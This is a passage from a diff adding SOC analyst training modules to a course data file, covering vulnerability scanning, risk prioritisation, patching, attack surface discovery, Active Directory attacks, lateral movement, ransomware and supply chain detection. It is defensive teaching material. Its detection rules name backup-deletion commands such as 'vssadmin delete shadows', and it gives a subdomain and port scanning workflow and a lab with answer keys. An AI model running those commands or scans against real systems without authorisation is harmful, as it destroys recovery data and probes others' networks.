+    └── PCI compliance scanning
+\`\`\`
+
+### TruRisk Scoring
+Qualys TruRisk goes beyond CVSS by incorporating:
+- Threat intelligence (is it being exploited?)
+- Asset business context
+- Temporal factors (how long exposed?)
+- Compensating controls
+
+## OpenVAS
+
+### Setup and Usage
+\`\`\`bash
+# Install OpenVAS (Greenbone Community Edition)
+sudo apt install gvm
+sudo gvm-setup
+sudo gvm-start
+
+# Access web interface at https://localhost:9392
+# Default: admin / (generated password)
+\`\`\`
+
+### Scan Configuration
+\`\`\`
+Target Configuration:
+  - Hosts: 192.168.1.0/24
+  - Port List: All TCP and Nmap top 1000 UDP
+  - Credentials: SSH key + Windows domain creds
+  
+Scan Config:
+  - Full and fast — Most common, balanced
+  - Full and deep — Thorough but slow
+  - Discovery — Asset enumeration only
+\`\`\`
+
+## Interpreting Results
+
+\`\`\`
+Critical Finding Example:
+  Plugin: MS17-010 (EternalBlue)
+  CVSS: 9.8
+  Exploitable: Yes (public exploit available)
+  Affected: WORKSTATION-42 (192.168.1.42)
+  
+  Action: IMMEDIATE PATCHING REQUIRED
+  - Apply MS17-010 security update
+  - Disable SMBv1 as compensating control
+  - Monitor for exploitation via SIEM (Event ID 5145)
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Nessus excels for SMBs and pen testing, Qualys for enterprise cloud, OpenVAS for budget-conscious teams",
+      "Always use credentialed scans for the most accurate vulnerability assessment",
+      "Qualys TruRisk scoring improves CVSS by adding exploit intelligence and business context",
+      "Scan results must be correlated with asset criticality and exploit availability for proper prioritization"
+    ],
+  },
+  {
+    id: "11.3",
+    courseId: "soc-analyst-path",
+    title: "CVSS Scoring & Risk Prioritization",
+    content: `
+# CVSS Scoring & Risk Prioritization
+
+The Common Vulnerability Scoring System (CVSS) provides a standardized method for rating vulnerability severity. Understanding CVSS scoring helps SOC analysts prioritize response and communicate risk.
+
+## CVSS v3.1 Components
+
+\`\`\`
+CVSS Score Components:
+├── Base Score (0-10) — Inherent severity
+│   ├── Attack Vector (AV): Network/Adjacent/Local/Physical
+│   ├── Attack Complexity (AC): Low/High
+│   ├── Privileges Required (PR): None/Low/High
+│   ├── User Interaction (UI): None/Required
+│   ├── Scope (S): Unchanged/Changed
+│   ├── Confidentiality (C): None/Low/High
+│   ├── Integrity (I): None/Low/High
+│   └── Availability (A): None/Low/High
+├── Temporal Score — Changes over time
+│   ├── Exploit Code Maturity
+│   ├── Remediation Level
+│   └── Report Confidence
+└── Environmental Score — Organization-specific
+    ├── Modified Base metrics
+    └── Security Requirements (C/I/A)
+\`\`\`
+
+## CVSS Severity Ratings
+
+| Score | Rating | Example |
+|-------|--------|---------|
+| 9.0-10.0 | Critical | RCE, no auth, network-accessible |
+| 7.0-8.9 | High | Privilege escalation, data theft |
+| 4.0-6.9 | Medium | DoS, limited information disclosure |
+| 0.1-3.9 | Low | Minor info leak with conditions |
+| 0.0 | None | Informational finding |
+
+## Beyond CVSS: Risk-Based Prioritization
+
+CVSS alone is insufficient. Combine with:
+
+### EPSS (Exploit Prediction Scoring System)
+\`\`\`
+EPSS provides probability of exploitation in next 30 days:
+  0.0-0.1 (0-10%)   — Low likelihood of exploitation
+  0.1-0.5 (10-50%)  — Moderate likelihood
+  0.5-1.0 (50-100%) — High likelihood, prioritize immediately
+
+Example:
+  CVE-2024-XXXX: CVSS 7.5, EPSS 0.02 → Lower priority
+  CVE-2024-YYYY: CVSS 6.1, EPSS 0.85 → HIGHER priority (actively exploited!)
+\`\`\`
+
+### CISA KEV (Known Exploited Vulnerabilities)
+- CISA maintains a catalog of actively exploited CVEs
+- Federal agencies must remediate within specified timelines
+- Any CVE on KEV list = immediate priority regardless of CVSS
+
+### Risk Score Formula
+\`\`\`
+Risk Priority = CVSS × EPSS Weight × Asset Criticality × Exposure Factor
+
+Where:
+  EPSS Weight: 1.0 (low) to 3.0 (high probability)
+  Asset Criticality: 1.0 (low) to 3.0 (critical infrastructure)
+  Exposure Factor: 1.0 (internal) to 2.0 (internet-facing)
+
+Example:
+  CVSS 7.5 × EPSS_W 2.5 × Asset 3.0 × Exposure 2.0 = 112.5 → CRITICAL
+  CVSS 9.8 × EPSS_W 1.0 × Asset 1.0 × Exposure 1.0 = 9.8 → MODERATE
+\`\`\`
+
+## SLA Definitions
+
+\`\`\`
+Remediation SLAs by Risk Priority:
+├── Critical (score >75): 24-48 hours
+├── High (score 50-75): 7 days
+├── Medium (score 25-50): 30 days
+├── Low (score <25): 90 days
+└── Accepted Risk: Annual review
+\`\`\`
+    `,
+    keyTakeaways: [
+      "CVSS Base Score combines attack vector, complexity, privileges, scope, and CIA impact",
+      "EPSS predicts exploitation probability and can reprioritize vulnerabilities vs CVSS alone",
+      "CISA KEV catalog flags actively exploited CVEs that need immediate attention",
+      "Effective risk scoring multiplies CVSS by exploitation probability, asset value, and exposure"
+    ],
+  },
+  {
+    id: "11.4",
+    courseId: "soc-analyst-path",
+    title: "Patch Management & Remediation Workflows",
+    content: `
+# Patch Management & Remediation Workflows
+
+Effective patch management bridges the gap between vulnerability discovery and remediation. SOC analysts must understand patching workflows to track remediation progress and validate fixes.
+
+## Patch Management Lifecycle
+
+\`\`\`
+Vendor Release → Assessment → Testing → Deployment → Verification
+      │              │           │           │             │
+   Patch Tuesday  Risk eval   Lab test   Production    Re-scan
+   Zero-day fix   Priority    Compat     Rollout       Validate
+                  ranking    check      plan          Confirm
+\`\`\`
+
+## Patch Classification
+
+| Type | Description | Timeline |
+|------|------------|----------|
+| Emergency | Active exploitation, critical systems | 24-48 hours |
+| Critical | High CVSS, no known exploit | 7 days |
+| Important | Medium severity, standard risk | 30 days |
+| Routine | Low risk, scheduled maintenance | 90 days |
+| Feature | Functionality updates, non-security | Next maintenance window |
+
+## Testing Strategy
+
+\`\`\`
+Test Environments:
+├── Dev/Lab — Initial compatibility testing
+│   └── Automated regression tests
+├── Staging — Mirror of production
+│   └── Application functionality validation
+├── Pilot Group — Small production subset (5-10%)
+│   └── Monitor for 24-48 hours
+└── Full Production — Phased rollout
+    ├── Phase 1: Non-critical systems (20%)
+    ├── Phase 2: Standard systems (50%)
+    └── Phase 3: Critical systems (30%)
+\`\`\`
+
+## Handling Exceptions
+
+### When Patching Isn't Possible
+\`\`\`
+Exception Workflow:
+1. Document WHY patching isn't possible
+   - Legacy application dependency
+   - Vendor doesn't support the patch
+   - Business-critical system can't have downtime
+   
+2. Implement compensating controls
+   - Network segmentation (isolate vulnerable system)
+   - WAF/IPS rules (virtual patching)
+   - Enhanced monitoring (SIEM alerts for exploit attempts)
+   - Access restrictions (limit who can reach the system)
+   
+3. Get risk acceptance approval
+   - Risk owner signs off
+   - Set review date (30/60/90 days)
+   - Document accepted risk in GRC platform
+   
+4. Track and re-evaluate
+   - Monitor for exploitation attempts
+   - Re-assess when patches become available
+   - Include in audit reporting
+\`\`\`
+
+## Rollback Planning
+
+\`\`\`
+Rollback Checklist:
+├── Pre-patch snapshot/backup created? ✓
+├── Rollback procedure documented? ✓
+├── Rollback tested in staging? ✓
+├── Communication plan for rollback? ✓
+├── Success criteria defined? ✓
+└── Monitoring in place for post-patch issues? ✓
+\`\`\`
+
+## SOC Integration
+
+SOC analysts support patch management by:
+1. **Monitoring post-patch** — Watch for service disruptions after deployment
+2. **Validating coverage** — Confirm patched systems no longer appear in scans
+3. **Exploit detection** — Alert on exploitation attempts for unpatched systems
+4. **Metrics tracking** — Report on patching SLA compliance
+5. **Threat correlation** — Match new CVEs to internal vulnerability data
+    `,
+    keyTakeaways: [
+      "Patches should be classified by urgency: emergency (24h), critical (7d), important (30d), routine (90d)",
+      "Always test patches in dev → staging → pilot → phased production rollout",
+      "When patching isn't possible, implement compensating controls and document risk acceptance",
+      "SOC analysts monitor post-patch health, validate fixes, and detect exploitation of unpatched systems"
+    ],
+  },
+  {
+    id: "11.5",
+    courseId: "soc-analyst-path",
+    title: "Attack Surface Management",
+    content: `
+# Attack Surface Management
+
+Attack Surface Management (ASM) is the continuous discovery, inventory, classification, and monitoring of an organization's internet-facing assets. It answers: "What can attackers see and reach?"
+
+## What is the Attack Surface?
+
+\`\`\`
+Attack Surface Components:
+├── Known Assets
+│   ├── Corporate websites and web apps
+│   ├── Email servers
+│   ├── VPN gateways
+│   └── Cloud infrastructure
+├── Unknown Assets (Shadow IT)
+│   ├── Developer test servers
+│   ├── Marketing microsites
+│   ├── Forgotten subdomains
+│   └── Unauthorized SaaS apps
+├── Third-Party Assets
+│   ├── Vendor-hosted applications
+│   ├── CDN endpoints
+│   ├── API gateways
+│   └── Partner connections
+└── Cloud Assets
+    ├── Storage buckets (S3, Azure Blob)
+    ├── Serverless functions
+    ├── Container registries
+    └── Database endpoints
+\`\`\`
+
+## Discovery Techniques
+
+### Passive Discovery
+\`\`\`
+Techniques:
+├── DNS enumeration — Subdomain brute-forcing, zone transfers
+├── Certificate Transparency — Search crt.sh for issued certificates
+├── WHOIS — Identify registered domains and IP ranges
+├── Shodan/Censys — Internet-wide scanning databases
+├── BGP data — Identify owned IP ranges
+└── GitHub/code repos — Search for leaked infrastructure info
+\`\`\`
+
+### Active Discovery
+\`\`\`
+Tools:
+├── Amass — Comprehensive subdomain enumeration
+├── Subfinder — Fast passive subdomain discovery
+├── Nuclei — Vulnerability scanning at scale
+├── httpx — HTTP probing and technology detection
+└── Masscan — Fast port scanning
+\`\`\`
+
+### Example Discovery Workflow
+\`\`\`bash
+# Step 1: Enumerate subdomains
+subfinder -d company.com -o subdomains.txt
+amass enum -passive -d company.com >> subdomains.txt
+sort -u subdomains.txt > unique_subdomains.txt
+
+# Step 2: Check which are alive
+cat unique_subdomains.txt | httpx -status-code -title -tech-detect -o alive.txt
+
+# Step 3: Port scan alive hosts
+nmap -iL alive_ips.txt -sV -top-ports 1000 -oN portscan.txt
+
+# Step 4: Check for known vulnerabilities
+nuclei -l alive.txt -t cves/ -o vulns.txt
+\`\`\`
+
+## Continuous Monitoring
+
+### What to Monitor
+| Category | What to Watch | Alert On |
+|----------|--------------|----------|
+| New assets | New subdomains, IPs, certificates | Any unknown asset appearing |
+| Exposed services | Open ports, new services | Database ports, admin panels |
+| SSL/TLS | Certificate expiry, weak ciphers | Expiry < 30 days, TLS < 1.2 |
+| Cloud storage | Public bucket/blob access | Any public access detected |
+| Code repos | Leaked credentials, API keys | Any secret in public repos |
+
+## Risk Reduction Strategies
+
+1. **Reduce** — Decommission unnecessary assets and services
+2. **Harden** — Apply security configurations to exposed services
+3. **Monitor** — Set up continuous ASM scanning and alerting
+4. **Segment** — Isolate critical assets from direct internet exposure
+5. **Patch** — Prioritize internet-facing vulnerabilities
+    `,
+    keyTakeaways: [
+      "Attack surface includes known assets, shadow IT, third-party services, and cloud resources",
+      "Combine passive (DNS, crt.sh, Shodan) and active (Amass, Nuclei) discovery for full coverage",
+      "Continuous monitoring should alert on new subdomains, exposed services, and public cloud storage",
+      "Reduce the attack surface by decommissioning unnecessary assets and hardening exposed services"
+    ],
+  },
+  {
+    id: "11.6",
+    courseId: "soc-analyst-path",
+    title: "Vulnerability Reporting & Stakeholder Communication",
+    content: `
+# Vulnerability Reporting & Stakeholder Communication
+
+Effective vulnerability reporting transforms raw scan data into actionable intelligence for different audiences. The ability to communicate risk clearly is as important as finding vulnerabilities.
+
+## Report Types
+
+\`\`\`
+Report Hierarchy:
+├── Executive Dashboard — Board/C-suite (quarterly)
+│   └── Risk trends, compliance status, business impact
+├── Management Report — IT leadership (monthly)
+│   └── SLA compliance, remediation progress, top risks
+├── Technical Report — IT/Security teams (weekly)
+│   └── Specific vulnerabilities, remediation steps, scan details
+└── Compliance Report — Auditors (as required)
+    └── PCI ASV scans, CIS benchmarks, regulatory compliance
+\`\`\`
+
+## Executive Dashboard Design
+
+### Key Metrics for Executives
+\`\`\`
+┌────────────────────────────────────────────────┐
+│  Vulnerability Risk Posture — Q4 2024          │
+├──────────────┬──────────────┬──────────────────┤
+│ Risk Score   │ Open Vulns   │ SLA Compliance   │
+│  72/100 ↓    │  1,247 ↓12%  │  89% ↑           │
+├──────────────┴──────────────┴──────────────────┤
+│ [Risk Trend - 12 month line chart]             │
+│ [Critical Vulns by Business Unit - bar chart]  │
+│ [MTTR by Severity - target vs actual]          │
+├────────────────────────────────────────────────┤
+│ Top 3 Risks:                                   │
+│ 1. Unpatched Exchange servers (3) — Critical   │
+│ 2. End-of-life Windows 2012 (12) — High        │
+│ 3. Public-facing Jenkins (1) — Critical        │
+└────────────────────────────────────────────────┘
+\`\`\`
+
+## Communicating Risk to Non-Technical Stakeholders
+
+### Translate Technical to Business Impact
+\`\`\`
+INSTEAD OF:
+  "CVE-2024-XXXX: CVSS 9.8, Remote Code Execution in Apache Struts,
+   affects 3 servers in DMZ, exploitation via crafted HTTP request"
+
+SAY:
+  "A critical vulnerability in our web infrastructure could allow
+   attackers to take full control of 3 customer-facing servers.
+   This could lead to data breach affecting 50,000 customers.
+   Estimated breach cost: $2-5M. Patch available, needs 4-hour
+   maintenance window this weekend."
+\`\`\`
+
+### Risk Language Framework
+| Technical Term | Business Translation |
+|---------------|---------------------|
+| RCE vulnerability | Attacker can take control of our systems |
+| SQL injection | Customer data could be stolen |
+| Privilege escalation | Attacker gains administrator access |
+| Denial of service | Service outage for customers |
+| Data exfiltration | Sensitive data leaves our network |
+
+## Trend Analysis
+
+### What to Track Over Time
+- **Mean Time to Remediate (MTTR)** by severity level
+- **Vulnerability density** — vulns per asset over time
+- **SLA adherence** — percentage remediated within SLA
+- **Recurrence rate** — vulnerabilities that reappear after patching
+- **Coverage** — percentage of assets being scanned regularly
+
+### Telling the Story with Data
+\`\`\`
+Narrative Example:
+"Over the past quarter, we reduced critical vulnerabilities by 35%
+ (from 89 to 58). However, our cloud infrastructure vulnerability
+ count increased by 22% due to rapid expansion. We recommend:
+ 1. Integrate cloud scanning into CI/CD pipeline
+ 2. Add 2 cloud security engineers
+ 3. Implement automated patching for non-critical cloud workloads"
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Create different reports for executives, managers, technical teams, and auditors",
+      "Translate technical vulnerabilities into business impact — cost, customers affected, downtime",
+      "Track MTTR, SLA adherence, vulnerability density, and recurrence rate over time",
+      "Tell a story with data — show trends, explain causes, and provide actionable recommendations"
+    ],
+  },
+
+  // ==========================================
+  // MODULE 12: ADVANCED ATTACK TECHNIQUES
+  // ==========================================
+  {
+    id: "12.1",
+    courseId: "soc-analyst-path",
+    title: "Active Directory Attacks & Defense",
+    content: `
+# Active Directory Attacks & Defense
+
+Active Directory (AD) is the backbone of enterprise identity management and a prime target for attackers. Understanding AD attack techniques enables SOC analysts to detect and respond to credential-based attacks.
+
+## AD Attack Landscape
+
+\`\`\`
+Common AD Attack Chain:
+Initial Access → Credential Theft → Lateral Movement → Privilege Escalation → Domain Dominance
+     │                │                    │                    │                    │
+  Phishing      LSASS dump            PsExec/WMI         Kerberoasting      Golden Ticket
+  VPN exploit   Mimikatz              Pass-the-Hash       DCSync             Shadow Admin
+\`\`\`
+
+## Kerberoasting
+
+### Attack Mechanism
+\`\`\`
+1. Attacker authenticates as any domain user
+2. Requests TGS ticket for service with SPN (Service Principal Name)
+3. TGS ticket is encrypted with service account's password hash
+4. Attacker extracts ticket and cracks offline
+5. If service account has admin privileges → game over
+\`\`\`
+
+### Detection
+\`\`\`
+# Event ID 4769: Kerberos Service Ticket was requested
+# Look for: Ticket Encryption Type = 0x17 (RC4) — weaker, preferred by attackers
+
+index=windows EventCode=4769 Ticket_Encryption_Type=0x17
+| stats count by Account_Name, Service_Name, Client_Address
+| where count > 10
+| sort -count
+\`\`\`
+
+**Key Indicators:**
+- Single account requesting many service tickets in short time
+- RC4 encryption (0x17) instead of AES (0x12)
+- Service ticket requests from unusual accounts
+
+## Pass-the-Hash (PtH)
+
+### Attack Mechanism
+\`\`\`
+1. Attacker dumps NTLM hash from compromised system
+2. Uses hash directly to authenticate (no password needed)
+3. NTLM protocol accepts hash as valid credential
+4. Attacker accesses remote systems as the compromised user
+\`\`\`
+
+### Detection
+\`\`\`
+# Event ID 4624: Logon Type 3 (Network) with NTLM
+# Suspicious: Local admin accounts logging in remotely
+
+index=windows EventCode=4624 Logon_Type=3 Authentication_Package=NTLM
+| where Account_Name!="ANONYMOUS LOGON"
+| stats dc(Workstation_Name) as unique_hosts by Account_Name
+| where unique_hosts > 3
+\`\`\`
+
+## DCSync Attack
+
+### Attack Mechanism
+\`\`\`
+1. Attacker compromises account with replication permissions
+2. Mimics a Domain Controller replication request
+3. Domain Controller sends all password hashes
+4. Attacker now has every credential in the domain
+\`\`\`
+
+### Detection
+\`\`\`
+# Event ID 4662: Directory Service Access
+# Look for: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
+
+index=windows EventCode=4662
+  Properties="*Replicating Directory Changes*"
+| where src_host NOT IN (known_domain_controllers)
+| alert severity=critical
+\`\`\`
+
+## Golden Ticket
+
+### Attack Mechanism
+Forge Kerberos TGT using the KRBTGT account hash — grants unrestricted domain access.
+
+### Detection
+- TGT with abnormally long lifetime (default is 10 hours)
+- TGT issued without corresponding AS-REQ on Domain Controller
+- Account name in ticket doesn't exist in AD
+- Ticket encryption using RC4 when policy enforces AES
+
+## Defense Recommendations
+
+\`\`\`
+Prevention & Hardening:
+├── Enforce AES encryption for Kerberos (disable RC4)
+├── Use managed service accounts (no password to crack)
+├── Implement LAPS for local admin passwords
+├── Enable Protected Users group for privileged accounts
+├── Monitor and audit AD replication permissions
+├── Implement tiered administration model
+└── Regular KRBTGT password rotation (twice, 12+ hours apart)
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Kerberoasting requests TGS tickets for offline cracking — detect via Event ID 4769 with RC4 encryption",
+      "Pass-the-Hash uses NTLM hashes directly — detect via network logons from unusual admin accounts",
+      "DCSync mimics DC replication — detect via Event ID 4662 from non-DC sources",
+      "Defense includes AES enforcement, managed service accounts, LAPS, and tiered administration"
+    ],
+    practicalExercise: {
+      title: "Active Directory Attack Detection",
+      description: "Detect and analyze a Kerberoasting attack using Windows Event Logs and SIEM data.",
+      steps: [
+        "Review the suspicious Kerberos activity in the logs",
+        "Identify the attack technique from the indicators",
+        "Determine the compromised accounts and scope",
+        "Answer the questions based on the AD investigation"
+      ],
+      labScenario: "Your SIEM triggers a custom detection rule: 'Potential Kerberoasting Activity Detected.' The alert shows user 'john.martinez' from workstation WS-DEV-04 requested TGS tickets (Event ID 4769) for 12 different service accounts within 3 minutes. All requests used RC4 encryption (0x17) instead of the organization's standard AES-256 (0x12). The targeted service accounts include 'svc-sql-prod', 'svc-backup-admin', and 'svc-exchange'. The account 'svc-sql-prod' has a password last set 540 days ago and has Domain Admin privileges. No IT change requests exist for john.martinez's activity.",
+      labQuestions: [
+        {
+          id: "12.1-q1",
+          question: "What Active Directory attack technique is indicated by mass TGS ticket requests with RC4 encryption?",
+          answer: "Kerberoasting",
+          hint: "Consider the attack that requests service tickets for offline password cracking."
+        },
+        {
+          id: "12.1-q2",
+          question: "What Windows Event ID logs TGS ticket requests used to detect this attack?",
+          answer: "4769",
+          hint: "Check the Event ID mentioned in the SIEM alert."
+        },
+        {
+          id: "12.1-q3",
+          question: "Which service account is the highest-value target due to its Domain Admin privileges?",
+          answer: "svc-sql-prod",
+          hint: "Look for the account with elevated privileges mentioned in the scenario."
+        },
+        {
+          id: "12.1-q4",
+          question: "What encryption type should the organization enforce to mitigate Kerberoasting?",
+          answer: "AES-256",
+          hint: "Check what the organization's standard encryption is versus what the attacker used."
+        }
+      ]
+    }
+  },
+  {
+    id: "12.2",
+    courseId: "soc-analyst-path",
+    title: "Lateral Movement Detection",
+    content: `
+# Lateral Movement Detection
+
+Lateral movement is how attackers expand their foothold within a network after initial compromise. Detecting lateral movement is critical because it represents the transition from a single-system compromise to a full network breach.
+
+## Common Lateral Movement Techniques
+
+\`\`\`
+Lateral Movement Methods:
+├── PsExec — Remote command execution via SMB
+├── WMI — Windows Management Instrumentation remote execution
+├── WinRM/PowerShell Remoting — Remote PowerShell sessions
+├── RDP — Remote Desktop Protocol
+├── SSH — Secure Shell (Linux environments)
+├── SMB File Sharing — Deploying payloads via network shares
+├── DCOM — Distributed COM object execution
+└── Scheduled Tasks — Remote task creation and execution
+\`\`\`
+
+## Detection by Technique
+
+### PsExec Detection
+\`\`\`
+Indicators:
+├── Service creation: PSEXESVC (Event ID 7045)
+├── Named pipe creation: \\\\PIPE\\PSEXESVC
+├── Network logon (Type 3) from unexpected source
+├── cmd.exe or powershell.exe spawned by PSEXESVC
+└── SMB traffic to ADMIN$ or IPC$ shares
+
+SIEM Query:
+index=windows (EventCode=7045 Service_Name="PSEXE*")
+  OR (EventCode=4624 Logon_Type=3 Process_Name="*psexec*")
+| stats count by src_ip, dest_host, Account_Name
+\`\`\`
+
+### WMI Lateral Movement
+\`\`\`
+Indicators:
+├── Process creation: wmiprvse.exe spawning unexpected children
+├── Event ID 5857: WMI Activity provider started
+├── Network connections from wmiprvse.exe to remote hosts
+└── WMI event subscriptions created remotely
+
+SIEM Query:
+index=sysmon EventCode=1 ParentImage="*wmiprvse.exe"
+  Image!="*\\WmiPrvSE.exe"
+| where NOT match(Image, "(?i)scrcons|mofcomp|wmiadap")
+| stats count by Computer, Image, CommandLine
+\`\`\`
+
+### RDP Lateral Movement
+\`\`\`
+Indicators:
+├── Event ID 4624: Logon Type 10 (RemoteInteractive)
+├── Event ID 1149: RDP successful connection
+├── Unusual source IPs connecting via RDP
+├── RDP connections between servers (not from admin workstation)
+└── RDP at unusual times
+
+SIEM Query:
+index=windows EventCode=4624 Logon_Type=10
+| stats earliest(_time) as first_rdp, count by Source_Network_Address, Account_Name
+| where Source_Network_Address NOT IN (known_admin_workstations)
+\`\`\`
+
+## Behavioral Detection
+
+### Network-Based Indicators
+\`\`\`
+Suspicious Patterns:
+├── Fan-out — One host connecting to many hosts on same port
+├── New connections — Host connecting to systems it never has before
+├── Port anomalies — Internal SMB/RDP to unexpected destinations
+├── Data staging — Large file copies between internal systems
+└── Timing — Connections at unusual hours
+\`\`\`
+
+### Graph-Based Analysis
+\`\`\`
+Build connection graphs:
+  Node = Host
+  Edge = Network connection (weighted by frequency)
+  
+Detect anomalies:
+  - New edges (host-to-host connections never seen before)
+  - High betweenness centrality (compromised pivot point)
+  - Unusual community connections (crossing network segments)
+\`\`\`
+
+## Honeypots and Deception
+
+\`\`\`
+Deception Technology:
+├── Honey accounts — Fake admin accounts (alert if used)
+├── Honey shares — Fake file shares with tracking
+├── Honey tokens — Canary files that alert when accessed
+├── Honey credentials — Planted in memory (Mimikatz triggers)
+└── Honey systems — Full decoy systems to attract and track
+\`\`\`
+
+Place honeypots strategically:
+- On every subnet segment
+- Near high-value assets
+- In expected lateral movement paths
+    `,
+    keyTakeaways: [
+      "PsExec creates PSEXESVC service and named pipes — detected via Event ID 7045",
+      "WMI lateral movement shows as wmiprvse.exe spawning unexpected child processes",
+      "RDP lateral movement between servers (not from admin workstations) is suspicious",
+      "Deception technology like honey accounts and canary files provides high-fidelity alerts"
+    ],
+  },
+  {
+    id: "12.3",
+    courseId: "soc-analyst-path",
+    title: "Ransomware Analysis & Response",
+    content: `
+# Ransomware Analysis & Response
+
+Ransomware remains the most impactful cyber threat to organizations. SOC analysts must understand ransomware kill chains, detect pre-encryption behavior, and execute rapid containment.
+
+## Modern Ransomware Kill Chain
+
+\`\`\`
+Double/Triple Extortion Model:
+┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐
+│ Initial  │→│ Establish │→│  Data    │→│ Deploy   │→│ Extort   │
+│ Access   │ │ Foothold │ │ Exfil    │ │ Ransomware│ │          │
+└──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘
+  Phishing    Cobalt Strike  Stage data  Encrypt     Ransom note
+  RDP brute   Persistence    Upload to   Delete      Leak threat
+  VPN exploit C2 channel     leak site   backups     DDoS threat
+  
+Average dwell time: 5-14 days before encryption
+\`\`\`
+
+## Pre-Encryption Detection
+
+### Early Warning Indicators
+\`\`\`
+Days/Weeks Before Encryption:
+├── Initial access — Phishing success, VPN brute force
+├── Reconnaissance — AdFind, BloodHound, SharpHound execution
+├── Credential theft — Mimikatz, LSASS dumping
+├── Lateral movement — PsExec, RDP to multiple servers
+├── Persistence — Service creation, scheduled tasks
+└── Defense evasion — EDR/AV tampering, AMSI bypass
+
+Hours Before Encryption:
+├── Backup deletion — vssadmin delete shadows, bcdedit
+├── Security tool disabling — Stopping AV services
+├── Domain admin compromise — DCSync, Golden Ticket
+├── Network share enumeration — Net share, net view
+└── Staging encryption tools — Deploying ransomware binary
+\`\`\`
+
+### Critical Detection Rules
+\`\`\`
+RULE: Backup Deletion (HIGH CONFIDENCE)
+index=windows (CommandLine="*vssadmin*delete*shadows*"
+  OR CommandLine="*wmic*shadowcopy*delete*"
+  OR CommandLine="*bcdedit*/set*recoveryenabled*no*")
+| alert severity=critical title="RANSOMWARE: Backup Deletion Detected"
+
+RULE: Mass File Encryption
+index=sysmon EventCode=11  /* File Created */
+| bin _time span=1m
+| stats dc(TargetFilename) as unique_files by Computer, _time
+| where unique_files > 100
+| alert title="RANSOMWARE: Mass File Modification Detected"
+\`\`\`
+
+## Containment Playbook
+
+\`\`\`
+IMMEDIATE (First 15 minutes):
+├── 1. Isolate infected endpoints via EDR
+├── 2. Block C2 IPs/domains on firewall
+├── 3. Disable compromised user accounts
+├── 4. Block lateral movement (SMB, RDP between segments)
+└── 5. Preserve evidence (don't reboot or wipe)
+
+SHORT-TERM (First 2 hours):
+├── 6. Identify encryption scope (which systems affected?)
+├── 7. Assess backup integrity (are backups compromised?)
+├── 8. Check for data exfiltration indicators
+├── 9. Engage incident response team / retainer
+└── 10. Notify legal counsel and management
+
+RECOVERY:
+├── 11. Identify ransomware variant (ID Ransomware, No More Ransom)
+├── 12. Check for available decryptors
+├── 13. Begin restoration from clean backups
+├── 14. Rebuild compromised systems from gold images
+└── 15. Enhanced monitoring during recovery
+\`\`\`
+
+## To Pay or Not to Pay?
+
+\`\`\`
+Considerations:
+├── FBI/CISA recommend NOT paying
+├── Payment doesn't guarantee decryption
+├── ~80% of payers are targeted again
+├── May violate OFAC sanctions
+├── Funds further criminal operations
+│
+├── However:
+│   ├── Some organizations have no viable backups
+│   ├── Business continuity impact may be catastrophic
+│   └── Cyber insurance may cover ransom payment
+│
+└── Decision should involve: Legal, Executive, Insurance, Law Enforcement
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Modern ransomware uses double/triple extortion with average 5-14 day dwell time",
+      "Pre-encryption indicators include backup deletion, AV disabling, and mass lateral movement",
+      "Containment requires immediate endpoint isolation, C2 blocking, and credential revocation",
+      "Never pay ransom without involving legal, insurance, and law enforcement stakeholders"
+    ],
+  },
+  {
+    id: "12.4",
+    courseId: "soc-analyst-path",
+    title: "Supply Chain Attack Detection",
+    content: `
+# Supply Chain Attack Detection
+
+Supply chain attacks compromise trusted software, services, or hardware to gain access to downstream targets. These attacks are devastating because they exploit the trust organizations place in their vendors and tools.
+
+## Supply Chain Attack Types
+
+\`\`\`
+Attack Vectors:
+├── Software Supply Chain
+│   ├── Compromised updates (SolarWinds)
+│   ├── Malicious packages (npm, PyPI)
+│   ├── Compromised build systems (Codecov)
+│   └── Trojanized installers
+├── Service Supply Chain
+│   ├── Compromised MSP/CSP (Kaseya)
+│   ├── Hijacked SaaS integrations
+│   └── Compromised API endpoints
+├── Hardware Supply Chain
+│   ├── Implanted chips/firmware
+│   ├── Modified during shipping
+│   └── Counterfeit components
+└── Open Source Supply Chain
+    ├── Dependency confusion
+    ├── Typosquatting packages
+    ├── Maintainer account compromise
+    └── Abandoned package takeover
+\`\`\`
+
+## Detection Strategies
+
+### Software Integrity Monitoring
+\`\`\`
+Verification Checks:
+├── Hash verification — Compare update hashes to vendor-published values
+├── Signature validation — Verify code signing certificates
+├── SBOM analysis — Software Bill of Materials for dependencies
+├── Binary analysis — Diff new versions against known-good
+└── Behavioral monitoring — Watch for unusual activity post-update
+\`\`\`
+
+### Network-Based Detection
+\`\`\`
+RULE: Trusted Software Connecting to Unknown C2
+index=proxy app_name IN ("SolarWinds", "Kaseya", "3CX")
+| where dest NOT IN (known_vendor_domains)
+| where dest_port IN (443, 80, 8443)
+| stats count by app_name, dest, dest_port
+| alert title="Supply Chain: Trusted App Connecting to Unknown Domain"
+\`\`\`
+
+### Dependency Confusion Detection
+\`\`\`
+Indicators:
+├── Internal package name appears on public registry
+├── Package version number anomalies (very high version)
+├── Build system pulling from public instead of private registry
+├── New dependencies added without code review
+└── Packages with install scripts executing system commands
+
+Prevention:
+├── Use private registries with namespace scoping
+├── Pin exact dependency versions
+├── Implement package allow-listing
+├── Scan dependencies with Snyk, Socket, or npm audit
+└── Review package.json changes in code review
+\`\`\`
+
+## Notable Supply Chain Attacks
+
+| Attack | Year | Impact | Method |
+|--------|------|--------|--------|
+| SolarWinds | 2020 | 18,000+ organizations | Compromised build system |
+| Kaseya | 2021 | 1,500+ businesses | Zero-day in MSP tool |
+| 3CX | 2023 | 600,000+ installations | Trojanized desktop app |
+| Codecov | 2021 | Thousands of repos | Compromised CI script |
+| Log4Shell | 2021 | Millions of apps | Vulnerable open-source library |
+
+## SOC Response to Supply Chain Alerts
+
+\`\`\`
+Response Playbook:
+1. ASSESS — Determine if you use the affected software/vendor
+2. INVENTORY — Identify all instances in your environment
+3. CONTAIN — Isolate or disable affected systems
+4. INVESTIGATE — Check for indicators of compromise
+5. COMMUNICATE — Notify stakeholders and affected parties
+6. REMEDIATE — Apply patches, remove compromised software
+7. HARDEN — Implement additional monitoring and controls
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Supply chain attacks exploit trust in vendors, software updates, and open-source dependencies",
+      "Monitor trusted software for connections to unknown domains as a key detection method",
